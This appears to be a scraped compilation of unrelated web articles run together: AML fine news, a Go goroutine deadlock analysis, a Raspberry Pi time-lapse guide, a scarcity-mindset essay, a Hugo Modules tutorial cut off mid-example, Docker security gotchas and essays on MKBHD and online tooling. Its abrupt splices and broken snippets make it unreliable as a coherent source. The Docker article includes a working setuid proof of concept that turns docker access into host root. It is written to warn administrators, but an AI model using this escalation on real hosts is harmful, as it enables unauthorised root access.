The Swedish Financial Inspection started to examine the SEB in 2015 in coordination with officials in Estonia, Latvia and Lithuania. The investigation was completed in 2019 and showed that "SEB's subsidiaries in the Baltic are exposed to a high risk of money laundering".</span></p><p><span><i>(June 2020)</i></span></p><h2><b>FCA fines Commerzbank London £ 37.8 million for AML violations</b></h2><p><span>The UK's financial regulator, the Financial Conduct Authority (FCA), fined the Commerzbank London branch £ 37.8 million for violations of AML controls. The FCA said in a statement that the violations stemming from Commerzbank pose great financial crime risks and damage the stability and integrity of the financial system in the UK. </span></p><p><span> As a result of FCA's audits, Commerzbank London detects three major failures, including the failure of periodic due diligence on its customers. According to FCA's audit report, the bank was also found to be insufficient in the control procedures of money laundering risks in customer transactions. Also, FCA found that the bank did not have adequate risk management systems. </span></p><p><span><i>(June 2020)</i><br></span>  <b><br></b></p><h2><b>HK regulator imposes $25.2m fine on Guotai Junan Securities</b></h2><p><span>Hong Kong's Securities and Futures Commission (SFC) imposed a $ 25.2 million fine on Guotai Junan Securities (Hong Kong) Limited for violations of anti-money laundering processes.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Even in Go, concurrency is still not easy (with an example)</h2>

	<p><small>September  1, 2020</small></p>
</div><div><p>Go is famous for making concurrency easy, through good language
support for <a href="https://golangbot.com/goroutines/">goroutines</a>. Except
what Go makes easy is only one level of concurrency, the nuts and
bolts level of making your code do things concurrently and communicating
back and forth through channels. Making it do the right things
concurrently is still up to you, and unfortunately Go doesn't
currently provide a lot of standard library support for correctly
implemented standard concurrency patterns.</p>

<p>For example, one common need is for a limited amount of concurrency;
you want to do several things at once, but only so many of them.
At the moment this is up to you to implement on top of goroutines,
channels, and things like the <a href="https://golang.org/pkg/sync/"><code>sync</code></a>
package. This is not as easy as it looks, and quite competent people
can make mistakes here. As it happens, I have an example ready to
hand today.</p>

<p><a href="https://github.com/google/gops">Gops</a> is a convenient command to
list (and diagnose) Go processes that are currently running on your
system. Among other things, it'll tell you which version of Go they
were compiled with, which is handy if you want to see if you have out
of date binaries that should be rebuilt and redeployed. One of the
things <code>gops</code> needs to do is look at all of the Go processes on your
system, which it does concurrently. However, it doesn't want to look
at too many processes at once, because <a href="https://github.com/google/gops/pull/118">that can cause problems with
file descriptor limits</a>. This
is a classic case of <em>limited concurrency</em>.</p>

<p>Gops implements this at the moment with code in <a href="https://github.com/google/gops/blob/6fb0d860e5fa50629405d9e77e255cd32795967e/goprocess/gp.go#L29">goprocess.FindAll()</a>
that looks like this, in somewhat sketched and reduced form:</p>

<blockquote><pre>func FindAll() []P {
   pss, err := ps.Processes()
   [...]
   found := make(chan P)
   limitCh := make(chan struct{}, concurrencyProcesses)

   for _, pr := range pss {
      limitCh &lt;- struct{}{}
      pr := pr
      go func() {
         defer func() { &lt;-limitCh }()
         [... get a P with some error checking ...]
         found &lt;- P
      }()
   }
   [...]

   var results []P
   for p := range found {
      results = append(results, p)
   }
   return results
}
</pre>
</blockquote>

<p>(In the real code there's a WaitGroup for coordination, and the
<code>found</code> channel gets closed appropriately.)</p>

<p>How this works is clear, and is a standard pattern (covered in eg
Go 101's <a href="https://go101.org/article/channel-use-cases.html">Channel Use Cases</a>). We use a
buffered channel to provide a limited number of tokens; sending a
value into the channel implicitly takes a token (and blocks if the
token supply is exhausted), while receiving a value from it puts a
token back in. We take a token before we start a new goroutine, and
the goroutine releases the token when it's done.</p>

<p>Except that <a href="https://github.com/google/gops/issues/123">this code has a bug if there are too many processes
to examine</a>. Even knowing
that there is a bug in this code, it may not be obvious.</p>

<p>The bug is that the goroutines only receive from <code>limitCh</code> to release
their token after sending their result to the unbuffered <code>found</code>
channel, while the main code only starts receiving from <code>found</code>
after running through the entire loop, and <strong>the main code takes
the token in the loop and blocks if no tokens are available</strong>. So
if you have too many processes to go through, you start N goroutines,
they all block trying to write to <code>found</code> and don't receive from
<code>limitCh</code>, and the main <code>for</code> loop blocks trying to send to <code>limitCh</code>
and never reaches the point where it starts receiving from <code>found</code>.</p>

<p>At one level, this bug is a very fragile bug; it only exists because
of multiple circumstances. If the goroutines took the token by
sending to <code>limitCh</code> instead of the main <code>for</code> loop doing it, the
bug would not exist; the main <code>for</code> loop would start them all, many
would stop, and then it would go on to receive from <code>found</code> so that
they could receive from <code>limitCh</code> and release their token so other
goroutines would run. If the goroutines received from <code>limitCh</code> to
release their token before sending to <code>found</code>, it wouldn't exist
(but because of error handling, it's simpler and more reliable to
do the receive in a <code>defer</code>). And if the entire <code>for</code> loop was in
an additional goroutine, the main code would go on to receive from
<code>found</code> and unblock completed goroutines to release their tokens,
so the fact that the <code>for</code> loop was blocked waiting to send to
<code>limitCh</code> wouldn't matter.</p>

<p>At another level, this shows how concurrency is not easy as easy
as it looks in Go. All you need is one mistake and things skid to
a halt, and all of the code involved can look good to a casual
examination. Getting concurrency correct is simply hard for people
(we can debate about why, but I think that it is is very clear).</p>

<p>(I'm sure that the people who wrote and approved the change that
added this concurrency limiting code to gops were good programmers.
A tricky case still tripped them up, passing all of their scrutiny.
Even when I knew that there was a concurrency problem in the code
and where it was (because my <code>gops</code> was hanging all of a sudden,
and <a href="https://github.com/go-delve/delve">Delve</a> told me where
everything was stuck), it still took me some time to see what the
exact problem was.)</p>

</ul>
<h2>Preparation</h2>
<h3>Flash the Pi</h3>
<p>You'll need to flash Raspberry Pi OS on a fresh SD Card.</p>
<p>Either with <a href="https://www.balena.io/etcher/">Balena Etcher</a> or the official <a href="https://www.raspberrypi.org/downloads/">Raspberry Pi Imager</a>. The procedure is extremely straight forward.</p>
<p>Just go through the steps and you have Rasperry Pi OS installed on a SD card.</p>
<h3>Set up Wi-Fi connectivity</h3>
<p>To get the Pi connect to your Wi-Fi, you'll need to create a file called <code>wpa_supplicant.conf</code> in the SD card.</p>
<p>The contents of <code>wpa_supplicant.conf</code> should look like this (configure it accordingly):</p>
<pre><code>ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
ap_scan=1
update_config=1

network={
  scan_ssid=1
  ssid="YOUR_WIFI_ACCESS_POINT"
  psk="YOUR_WIFI_PASSWORD"
}
</code></pre>
<h3>Enable SSH access</h3>
<p>To enable SSH access (with the user <code>pi</code> and password <code>raspberry</code>), simply create an empty file (without extension), called <code>ssh</code> in the SD card.</p>
<h3>Enable Camera module</h3>
<p>To enable to camera module, you can configure it through the <code>raspi-config</code> utility.</p>
<p>But also with the file <code>config.txt</code> in SD card.</p>
<p>Open it and add the following to it:</p>
<pre><code>start_x=1
gpu_mem=128
</code></pre>
<p>Just make sure there are no other occurrencies for <code>start_x</code> or <code>gpu_mem</code></p>

<h2>Take image with raspistill</h2>
<blockquote>
<p><code>raspistill</code> is the command line tool for capturing still photographs with the camera module.</p>
</blockquote>
<p>The idea is to take a snapshot every x minutes using <code>raspistill</code></p>
<p>To take a single image, I'm using the following bash script called <code>/home/pi/take-snapshot</code>:</p>
<pre><code>#!/bin/bash

set -e

DATE=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
SNAPSHOTS_DIR=/home/pi/snapshots
SNAPSHOT_PATH="$SNAPSHOTS_DIR/$DATE.jpg"
CURRENT_PATH="$SNAPSHOTS_DIR/current.jpg"

echo "$DATE"
mkdir -p "$SNAPSHOTS_DIR"
echo "taking snapshot $SNAPSHOT_PATH"
raspistill \
    --width 1280 \
    --height 960 \
    --quality 100 \
    --output "$SNAPSHOT_PATH"
echo "snapshot saved $SNAPSHOT_PATH"

echo "adding watermark $SNAPSHOT_PATH"
cd $SNAPSHOTS_DIR
montage \
  -label "$DATE" \
  $SNAPSHOT_PATH \
  -pointsize 30 \
  -gravity Center \
  -geometry +0+0 \
  $SNAPSHOT_PATH

cp $SNAPSHOT_PATH $CURRENT_PATH
</code></pre>
<p>This script will take a snapshot, name it in the format <code>%Y-%m-%dT%H:%M:%SZ.jpg</code> and put it in the folder <code>/home/pi/snapshots</code>.</p>
<p>At the end this photo is also watermarked using <code>montage</code> from the ImageMagick family.</p>
<h2>Schedule capture with crontab</h2>
<p>To take a photo every 5 minutes using the above script, you can set up a simple cron job for that.</p>
<p>Just run <code>crontab -e</code> to edit the cron schedules and add the following lines</p>
<pre><code>SHELL=/bin/bash
*/5 * * * * sh /home/pi/take-snapshot &gt;&gt; /home/pi/snapshots.log 2&gt;&amp;1
</code></pre>
<h2>Directory listing of snapshots</h2>
<p>You can expose a web server on port 80 to easily list all images (and time-lapses) taken in the folder <code>/home/pi/snapshots</code>.</p>
<p>Start the server at boot by adding the following to your crontab</p>
<pre><code>@reboot sudo python3 -m http.server --directory /home/pi/snapshots 80
</code></pre>
<h2>Create time-lapse with ffmpeg</h2>
<p>Taking a time-lapse for the day <code>2020-08-31</code> with ffmpeg is as easy as running</p>
<pre><code>cat 2020-08-31*.jpg | ffmpeg -r 10 -i - -c:v libx264 -vf "format=yuv420p,scale=1280:-2" time-lapse-2020-08-31.mp4
</code></pre>

<p>You can clone / fork the repo <a href="https://github.com/christian-fei/raspberry-pi-time-lapse">christian-fei/raspberry-pi-time-lapse</a> and create your first time-lapse in no time.</p>
<p>There are various scripts that simplify the steps above:</p>
<ul>
<li><code>take-snapshot</code> to take a watermarked and timestamped photo in the folder <code>snapshots/</code></li>
<li><code>server</code> to start a HTTP server on port 80 listing all snapshots and time-lapses taken so far</li>
<li><code>rsync-snapshots</code> to sync the snapshots to from the Raspberry Pi to your PC</li>
<li><code>create-time-lapse</code> to create a time-lapse for a specific date</li>
<li><code>crontab</code> to schedule the snapshots and spin up the server</li>
</ul>

<p>I&nbsp;was&nbsp;listening to a podcast the other day, and&nbsp;the hosts were talking about the scarcity&nbsp;mindset&nbsp;and how it sabotages people’s success.&nbsp;</p>



<p>Stephen Covey wrote in&nbsp;<em>The Seven&nbsp;</em><em>Habits of Highly Effective People</em>:&nbsp;</p>



<p><em>“Most people are deeply scripted in what I call the Scarcity Mentality. They see life as having only so much, as though there were only one pie out there. And if someone were to get a big piece of the pie, it would mean less for&nbsp;everyone else.”&nbsp;&nbsp;</em></p>



<p><br>It occurred to me that we can think this way about our tech skills. I bet you’ve worked with someone that rarely shares vital information (and maybe you do this too!)</p>



<p>Thinking that our knowledge is extremely precious and that there is a finite amount of know-how out there, we keep some (or all!) of the best to ourselves. In the Information Age, our expertise is what gives our position and status – so if someone has a scarcity mindset, they tend to be reluctant to give that away.&nbsp;</p>



<p>The thinking is, “if I give away all of the most valuable knowledge, then I will lose my advantage.”</p>



<p>But this equation is wrong. Giving knowledge away is not reducing your advantage. By sharing, you’ve established yourself as their expert – and it increases your stature with them!&nbsp;</p>



<p><strong>The scarcity mindset is a self-limiting behavior.&nbsp;</strong></p>



<p>The scarcity mindset ensures that you’ll get less from those around you. Your thoughts are keeping them from giving as freely to you because they know you’re holding back.&nbsp;</p>



<p>If you’re generous with your time and your knowledge, people will reciprocate. I’ve seen it happen time and time again.&nbsp;</p>



<p>Sharing is contagious – and having generosity embedded in your team’s culture boosts your effectiveness.&nbsp;</p>



<p><strong>The flip side of scarcity is abundance.</strong></p>



<p>Stephen continues,&nbsp;</p>



<p>“<em>The Abundance Mentality, on the other hand, flows out of a deep inner sense of personal worth and security. It is the paradigm that there is plenty out there and enough to spare for everybody. It results in sharing of prestige, of recognition, of profits, of decision making. It opens possibilities, options, alternatives, and creativity.”&nbsp;</em><br>An abundance mentality is what we should be striving for – there is more than enough for us all to have what we need!&nbsp;</p>



<p>Why should you share? Because THE ACT OF TEACHING strengthens your understanding, so you have even MORE knowledge than when you started!</p>



<p>I challenge you to share your knowledge this week. I know you’ll see dividends yourself as you build up those around you.</p>



<p>Best,</p>



<p>Ken</p>

September 2, 2020 | https://www.thenewdynamic.com/article/hugo-modules-everything-from-imports-to-create/ | <a href="https://web.archive.org/web/*/https://www.thenewdynamic.com/article/hugo-modules-everything-from-imports-to-create/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Back in July last year Hugo 0.56.0 introduced a powerful Module system. Pretty much like any package solution it allowed any Hugo project defined as a Module, be it a full website or a theme or a component to use any files stored on a repository somewhere and mount it as its own. It also enabled any Hugo project to become a full fledge Hugo Modules with its own config and dependencies which any other project could mount.</p><p>In this article, we’ll see how any Hugo project can use files stored on a distant repository and make them its own using the Module&nbsp;<strong>imports</strong>&nbsp;and&nbsp;<strong>mounts</strong>&nbsp;logic.</p><p>Then, we’ll dive into what exactly constitute a Hugo Module by creating our own!</p><h3 id="init-the-project-as-a-module">Init the project as a Module</h3><p>Before you can import a repository and use its files, your project will need to be initiated as a Hugo Module.</p><p>For this, you need to reference a repository.</p><p>We’ll assume your Hugo project already has a GitHub repo which lives at <code>https://github.com/me-me-me/my-repo</code></p><p>Using the terminal for your project root directory:</p><div><pre><code data-lang="bash">hugo mod init github.com/me-me-me/my-hugo-project
</code></pre></div><p>☝️ The above when successful will generate a file called <code>go.mod</code> at the root. It should look something like the following:</p><div><pre><code data-lang="go"><span>module</span> <span>github</span><span>.</span><span>com</span><span>/</span><span>me</span><span>-</span><span>me</span><span>-</span><span>me</span><span>/</span><span>my</span><span>-</span><span>hugo</span><span>-</span><span>project</span>

<span>go</span> <span>1.14</span>
</code></pre></div><p>It will also have created a <code>go.sum</code> file. We won’t concern ourselves with that one.</p><h3 id="import-a-distant-repository">Import a distant repository</h3><p>For this very basic examples, we’ll try and incoporate the icons made available by the Bootstrap team through their repo at
<a href="https://github.com/twbs/icons" target="_blank" rel="noopener">https://github.com/twbs/icons</a>
.</p><p>Everything happens in your project <code>config.yaml</code> using the reserved <code>module</code> key and its <code>imports</code> array.</p><div><pre><code data-lang="yaml"><span>module</span><span>:</span><span>
</span><span>  </span><span>imports</span><span>:</span><span>
</span><span>    </span>- <span>path</span><span>:</span><span> </span>github.com/twbs/icons<span>
</span></code></pre></div><p>Now if you run <code>hugo</code> you will notice a new file has been dropped, <code>go.sum</code> but we won’t concern ourselves with it. On the other end, our <code>go.mod</code> file just got a new line.</p><div><pre><code data-lang="go"><span>module</span> <span>github</span><span>.</span><span>com</span><span>/</span><span>me</span><span>-</span><span>me</span><span>-</span><span>me</span><span>/</span><span>my</span><span>-</span><span>hugo</span><span>-</span><span>project</span>

<span>require</span> <span>github</span><span>.</span><span>com</span><span>/</span><span>twbs</span><span>/</span><span>icons</span> <span>v1</span><span>.0.0</span> <span>// indirect
</span></code></pre></div><p>That’s good but it does not tell Hugo what to do with those files.</p><p>With the <code>mounts</code> key, attached to our Bootstrap import, we’ll give Hugo more directions:</p><div><pre><code data-lang="yaml"><span>module</span><span>:</span><span>
</span><span>  </span><span>imports</span><span>:</span><span>
</span><span>   </span>- <span>path</span><span>:</span><span> </span>github.com/twbs/bootstrap<span>
</span><span>     </span><span>mounts</span><span>:</span><span>
</span><span>     </span>- <span>source</span><span>:</span><span> </span>icons<span>
</span><span>       </span><span>target</span><span>:</span><span> </span>assets/icons<span>
</span></code></pre></div><p>Mounts are unlimited but for now we just added one with the following settings:</p><ul><li><code>source</code> param points to the location of the mounted files in the distant repo. Here we’re pointing to the <code>icons</code> directory at the root of the repo.</li><li><code>target</code> param points to the location the files should be mounted into our Hugo’s union file system.</li></ul><p>With that mount in place, we will be able to access the icons svgs just like any other files in our project:</p><div><pre><code data-lang="go-html-template"><span>{{</span><span> </span><span>with</span><span> </span><span>resources</span><span>.Get</span><span> </span><span>"icons/cart.svg"</span><span> </span><span>}}</span>
  <span>&lt;</span><span>div</span> <span>class</span><span>=</span><span>"fill-current w-4"</span><span>&gt;</span>

  <span>&lt;/</span><span>div</span><span>&gt;</span>
<span>{{</span><span> </span><span>end</span><span> </span><span>}}</span>
</code></pre></div><p>That’s it!</p><p>We can safely print this cart SVG without copying it to our project’s directory.</p><p>And in the off chance that this particular cart icon needs to be customized we can rely on Hugo’s union file system!</p><p>All we’d have to do is create an homonymous icon file in our project at <code>assets/icons/cart.svg</code> to have it being used in place of Bootstrap’s own cart icon.</p><p><strong>or…</strong></p><p>We could even go crazier and use the icon from another distant repo just for that cart icon… 🤩</p><div><pre><code data-lang="yaml">- <span>path</span><span>:</span><span> </span>github.com/refactoringui/heroicons<span>
</span><span>    </span><span>mounts</span><span>:</span><span>

</span><span>      </span><span>target</span><span>:</span><span> </span>assets/icons<span>
</span></code></pre></div><p>☝️ Here we are importing two repos, with their own <code>mounts</code> settings.</p><div><p>Note that regardless of the files mounted, Hugo will have to download the whole repository, so you might think twice before importing a 5MB repo for one of its svgs.</p></div><h3 id="upgrading">Upgrading</h3><p>What if the repo is updated? The default behaviour of Hugo Module is, on the first import, to grab the latest release, or if no release is found, the latest head on the default branch. That’s why Hugo wrote <code>v1.0.0</code> after the require directive.</p><p>If <code>github.com/twbs/icons</code> releases <code>v1.1.0</code> and you want that new release you can:</p><div><pre><code data-lang="bash">hugo mod get -u github.com/twbs/bootstrap
</code></pre></div><p>This should update your <code>go.mod</code> file with the latest release.</p><p>Now if you want a specific release rather than the latest, (we’ll use another repo for that example):</p><div><pre><code data-lang="bash">hugo mod get github.com/twbs/bootstrap@v3.4.0
</code></pre></div><p>If you want a specific commit, you’ll need to @ its long hash like so</p><div><pre><code data-lang="bash">hugo mod get github.com/twbs/bootstrap@394812b61d4dc80bfb2e090de925ae0dfc4cc29b
</code></pre></div><div><p>You should commit your <code>go.mod</code> and <code>go.sum</code> file of course, so that everybody working on the project uses the same versions!</p></div><h2 id="create-a-hugo-module">Create a Hugo Module</h2><p>The above was interesting as we covered how we can import any repo out there and make its files part of our project. But the real power comes from using full fledge Hugo Modules as they alone can sport template files, asset files, data files, even <strong>content</strong> files!</p><p>And what better way to learn about them than by creating our own!</p><p>For the sake of the example, we’ll create our own Icon Module. It will:</p><ol><li>Import some SVG files from a distant repo</li><li>Create a page listing all available icons on the site.</li><li>Load its own <code>icon</code> partial which will ease up the printing of any icon on the project.</li></ol><p>First we’ll create a directory on our local machine. We’ll give it a poor but short name: <code>hugo-icons</code>.</p><h3 id="1-imports">1. Imports</h3><p>The first thing we need is a <code>config.yaml</code> file for our Module to register its imports.</p><p>Yes, any Hugo project, be it a website or a theme or a component can import other Modules or repo. The import tree is infinite. As we already mentioned, it’s a real dependency solution!</p><p>Our imports and mounts settings will be very similar to what we did before. We’ll just mount the files in a reserved directory to make sure we don’t have file conflicts with other modules.</p><div><pre><code data-lang="yaml"><span># config.yaml</span><span>
</span><span></span><span>module</span><span>:</span><span>
</span><span>  </span><span>imports</span><span>:</span><span>
</span><span>   </span>- <span>path</span><span>:</span><span> </span>github.com/twbs/bootstrap<span>

September 2, 2020 | https://bhoey.com/blog/docker-in-2020-strange-surprises-and-unexpected-gotchas/ | <a href="https://web.archive.org/web/*/https://bhoey.com/blog/docker-in-2020-strange-surprises-and-unexpected-gotchas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>The ability to isolate a given program along with its dependencies has long held the promise of promoting separation of concerns, avoiding conflicts and improving security and deployments.</p>
<p>Docker, in particular, with its large ecosystem and ease of use makes prototyping extremely easy. In fact, you'd be hard-pressed to find a technical post on this site that doesn't also include docker instructions for readers to try the examples for themselves.</p>
<p>That said, despite years of use and improvements there are still surprises and unexpected gotchas that can easily catch people off guard.</p>
<h3>1. Docker Bypasses UFW Firewall Rules</h3>
<p>Out of the box, if you run docker containers on a system protected by the ufw firewall (Ubuntu/Debian/etc), <b>any ports published by a container will bypass ufw rules on the host.</b> This was noticed back in at least <a href="https://www.mkubaczyk.com/2017/09/05/force-docker-not-bypass-ufw-rules-ubuntu-16-04/">2017</a>, and <a href="https://github.com/docker/for-linux/issues/777">is</a> <a href="https://www.techrepublic.com/article/how-to-fix-the-docker-and-ufw-security-flaw/">still</a> <a href="https://stackoverflow.com/a/51741599">a</a> <a href="https://github.com/docker/for-linux/issues/690">problem</a> in 2020.</p>
<p>As a practical example, say you have ufw configured to block all incoming traffic except for SSH. If you then start up a test mysql container and include the -p option so that you can connect to it afterwards, ie :</p>
<pre>docker run --name mysql1 -e MYSQL_ROOT_PASSWORD=password -p 3306:3306 -d mysql:latest
</pre>
<p>Congrats, your new, insecure mysql container is now available to everyone on the network who wants to connect to it, bypassing your otherwise strict ufw rules.</p>
<p>There are workarounds that approach the issue from different angles, from explicitly publishing ports to localhost to disabling dockerd from manipulating iptables, but this is one of the most concerning default behaviors that can expose unprotected services to remote abuse.</p>
<h3>2. Leaky Permission Boundaries</h3>
<p><b>If you've given a user the ability to run docker containers on a host, you've given them the ability to <u>become root on that host.</u></b> This is due to dockerd's default mapping of userids between the container and host. Below is a small proof-of-concept:</p>
<pre>become_root.c
-------------

   #include &lt;stdlib.h&gt;
   #include &lt;unistd.h&gt;

   int main(){
     setuid(0);
     system("/usr/bin/whoami");
     return 0;
   }

$ gcc become_root.c -o become_root

$ ./become_root
   ben

prepare.sh
----------
   #!/bin/sh
   cp /become_root /opt/become_root_setuid
   chmod 4755 /opt/become_root_setuid

Dockerfile
----------
   FROM busybox
   COPY prepare.sh  become_root /
   CMD ["/prepare.sh"]

$ docker build --tag setuid .
$ docker run --rm --name test1 --volume "$PWD":/opt setuid

$ ls -l become_root*
   -rw-r--r-- 1 ben  ben    115 Aug 31 22:52 become_root.c       &lt;--- source code
   -rwxr-xr-x 1 ben  ben  16664 Sep  1 09:18 become_root         &lt;--- original program
   -rwsr-xr-x 1 root root 16664 Sep  1 09:33 become_root_setuid  &lt;--- program copy with setuid root

$ ./become_root_setuid
   root
</pre>
<p>Above the beome_root program attempts to setuid to 0 (root) and then run `whoami` to display the effective userid. Running it locally does not give the user root access since the file is owned by user 'ben' (the setuid bit is also not set but this is irrelevant since setuid runs the program as the file owner, ie 'ben').</p>
<p>To get around this, the program and a small script were added to a minimal docker image in order to copy the become_root program to a shared volume specified at runtime and set the setuid bit. Since dockerd (by default) mirrors the userids from the container to the host for volume I/O, the file is written <u>as root</u> and now has the setuid bit set. This sequence effectively allows any user with the permissions to run a docker container to also create arbitrary programs that will run as root on the host system.</p>
<p>There are efforts to address this such as <a href="https://docs.docker.com/engine/security/rootless/">Rootless mode</a>, however even ignoring its current experimental status, it needs to be explicitly configured and introduces limitations which may not be feasible in your environment.</p>
<h3>3. Dockerized Applications Run As Root</h3>
<p>Minimizing the number of processes running as root has been an accepted best-practice for a very, very long time. The general idea being that even if a process is successfully compromised, its "blast radius" is confined only to the resources it has access to.</p>
<p>However, without explicitly configuring a Dockerfile to switch to a different user, all dockerized applications will run as root. The American Express Team has a <a href="https://americanexpress.io/do-not-run-dockerized-applications-as-root/">good write-up</a> worth reading if you're unfamiliar with the risk this introduces even when running applications in a containerized environment.</p>
<h3>4. Programs Consisting of Multiple Processes</h3>
<p>Docker excels when working with a single process, however as noted in <a href="https://docs.docker.com/engine/faq/#how-do-i-run-more-than-one-process-in-a-docker-container">the official FAQ</a>, dockerizing programs that consist of multiple processes, though possible, isn't really the best fit with how docker is designed to work.</p>
<p>Postfix is a good example where separation of <a href="http://www.postfix.org/OVERVIEW.html">specific-purpose processes</a> has been central to its operation and security model. (It should be noted that there have been <a href="http://www.postfix.org/announcements/postfix-3.3.0.html">recent changes</a> to ease Postfix's use in container environments, but even with these changes there are still <a href="https://stackoverflow.com/questions/49495679/dockerizing-postfix-relay-server">additional</a> <a href="https://serverfault.com/questions/885828/is-there-any-way-to-run-postfix-in-foreground#comment1209656_916072">aspects</a> to consider).</p>
<h3>5. Docker Compose YAML V2 vs V3</h3>
<p>Its almost inevitable that you will run across a mix of V2 and V3 docker-compose.yml examples in the wild and wonder what the difference is and which version should you be using.</p>
<p>There is a brief history and overview written in <a href="https://github.com/docker/docker.github.io/pull/7593">this PR</a> as well as the <a href="https://docs.docker.com/compose/compose-file/compose-versioning/">official documentation</a>, but the TL;DR is that there were structural and directive changes made for the V3 format mainly to support running in Docker Swarm that do not typically apply to the most common docker use-cases. As of this writing you can still use either compose format without issue, however I will note that Docker (the company) recommends V3.</p>
<h3>6. Limitations Of Dependency Support In Docker Compose</h3>
<p>Another surprise when working with docker-compose comes when trying to establish container dependencies. For example, you wouldn't want your webapp container to start until the backend container it relies on is up and ready to receive connections. Since docker-compose's primary purpose is to define related groups of containers, there is a "<a href="https://docs.docker.com/compose/compose-file/#depends_on">depends_on</a>" directive that allows you to define such relationships, but its actual operation leaves much to be desired.</p>
<p>"depends_on" does indeed take dependencies into consideration when starting containers up and shutting them down. However docker-compose only checks if a container's process <u>has started</u> before launching dependent containers, not if it has begun listening on a port or is in any other kind of "ready" state. This results in firing up each container immediately after each other, providing very little dependency-aware value.</p>
<p>The official documentation <a href="https://docs.docker.com/compose/startup-order/">tries to justify</a> this limitation, but frankly it comes off as a bit of a cop out. Yes, determining a "ready" state may differ from one application to the next, but there are a handful of established methods that will cover the vast majority of use-cases.</p>
<p>Instead, end-users are forced to rely on ugly hacks to workaround this limitation. You can see one such workaround in <a href="https://bhoey.com/blog/high-availability-rabbitmq-with-mirrored-queues/">my RabbitMQ HA post's</a> docker-compose.yml where an additional sleep interval was required to avoid a race condition when the RabbitMQ brokers start up. Alternatively there are numerous "wait-for..." scripts and docker images of varying quality available that aim to provide the functionality missing in the core program.</p>
<p>It looks like there was <a href="https://github.com/docker/compose/issues/3754">some work</a> done in the past to integrate health checks with depends_on, however since V3 no longer supports conditional form of depends_on this doesn't appear to be a viable option.</p>
<h3>Final Thoughts</h3>
<p>As the containerization landscape continues to mature I look forward to improvements both in shipped defaults and in people's awareness of risks and trade-offs involved with different configurations.</p>
<p>Hopefully this post brought to light something that you weren't aware of before and can help better prepare you for improved container management in the future. As always, good luck and happy coding!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The production quality of <a href="https://www.youtube.com/c/mkbhd">Marques Brownlee videos</a> is stellar and Marques has developed through the years an incredible talent for visual storytelling.</p>
<p>But I'd like to get more into some of the specific reasons why I believe we love his videos. I'm a technologist, writer, and storyteller, so these things are often on my mind.</p>
<h2>No unnecessary camera movements</h2>
<p>Many people might confuse more camera movements as better storytelling, but 99% of the time it's the exact opposite. Think about how intentional David Fincher is with where he places the camera, and if it will move or won't. One emblematic example: in Gone Girl there's a single hand-held shot (can't find it on YouTube, but it's Ben Affleck running from journalist and other people).</p>
<p>Marques does the same, and most of the time <strong>if the camera moves, there's a reason</strong>.</p>
<p><img src="https://fabriziorinaldi.com/images/blog/a51599f1-c1d1-4d39-a87a-87661866aae4.jpeg"></p>
<h2>Color balance</h2>
<p>Color is great, and it's a powerful storytelling tool. Just like camera movements though, too much color, or too many colors, can be distracting and overwhelming.</p>
<p>Usually, colors in Marques videos are extremely consistent, and never unnecessarily flashy.</p>
<p><img src="https://fabriziorinaldi.com/images/blog/ffca8a76-ddc9-493f-81f5-d9bf1cd542b3.jpeg"></p>
<h2>Straight to the point</h2>
<p>After a 4 seconds intro, and sometimes a few beautiful shots of the topic of the video, Marques goes straight to the point and doesn't waste any of your time.</p>
<h2>Authenticity</h2>
<p>I don't know how you feel, but for me watching MKBHD feels like being with a techie friend who genuinely wants to tell me about some tech that is new and exciting.</p>
<p>It doesn't feel like marketing, it doesn't feel like overthinking or bullshit, it genuinely feels like someone saying <em>hey check this out</em>.</p>
<p>We've bombarded daily by content of any kind, and so much of it feels useless or fake that <strong>we crave authenticity.</strong></p>
<p>Marques gets it, it doesn't matter how many millions are in his bank account.</p>
<p><img src="https://fabriziorinaldi.com/images/blog/2e1c40b9-c89d-4857-9de1-ad88084dd35c.jpeg"></p>
<h2>Simmetry and composition</h2>
<p>Finally, it's worth mentioning how precise, symmetric and pleasing to watch are Marques shots. They almost have a calming effect, and you can feel how intentional he is when placing objects for the camera.</p>
<p><img src="https://fabriziorinaldi.com/images/blog/e83ee697-72ff-4aaf-9e91-2e466c194def.jpeg"></p>
<p>Do you think there are other core reasons we love his videos? Let me know <a href="https://twitter.com/linuz90">on Twitter</a>.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Something my colleagues know well is how little I trust online tools like <a href="https://jwt.io/">jwt.io</a>, online JSON validators or online tooling in general, but it also bleeds into <a href="https://www.jvt.me/mf2/2020/08/zebqf/">comments I make online</a> and in my blog posts, too, and I thought I'd share a little bit of a reason as to why.</p><p>Instead of using an online service, I will reach for a way to run it locally, using whichever programming language toolchain I have available. But why? Why wouldn't I recommend something like jwt.io? Or an online JSON validator, especially if they boast client-side functionality, and mean I don't need things installed?</p><p>Let's start with a bit of background. Firstly, I'd just like to caveat this all with the note that <strong>I have no access to Production data, customer or otherwise</strong>. All of these examples are referencing Non-Production examples.</p><p>I also want to caveat this with the fact that this is <strong>not a personal attack</strong> on jwt.io. I am using them as an example as they're a well-known and well-used service, and I've seen issues with it before. Auth0 run it, and are probably one of the few companies we'd want to be running it. It's also <a href="https://github.com/jsonwebtoken/jsonwebtoken.github.io">Open Source</a> <em>but</em> one of the great difficulties of Web-hosted services are that we have no idea if the source code that we're told is being used is actually being used!</p><p>I'm currently working on the Open Banking platform for Capital One. We're fortunate to have very restricted access to Production, which makes things safer for everyone. One thing we strive to do is to treat Non-Production secrets like Production ones where possible - where we shouldn't have access to them at all, and shouldn't be sharing them with external services. Some of these Non-Production secrets may be usable outside of Capital One, for instance Open Banking Sandbox signing certificates.</p><p>We perform a fair bit of testing in our Non-Production environments and sometimes need to debug things, such as what's inside a JWT (as Open Banking introduces several places they're used). I've been burned a number of times by folks putting a Non-Production JWT or an Open Banking Sandbox certificate into jwt.io. Although Non-Production, these are sensitive in of themselves, as they have implementation details for our services, and as mentioned, certain things could be used outside of Capital One.</p><p>The biggest reason I hear from folks using online tooling is that it's easier, and that they'd rather do that than find out how to run it locally. I disagree with this, but am quite biased, as I often have a blog post for many of these common issues. I love sharing my blog with others and having a handy solution, or if I don't have an answer to a problem, I'll find out how and <a 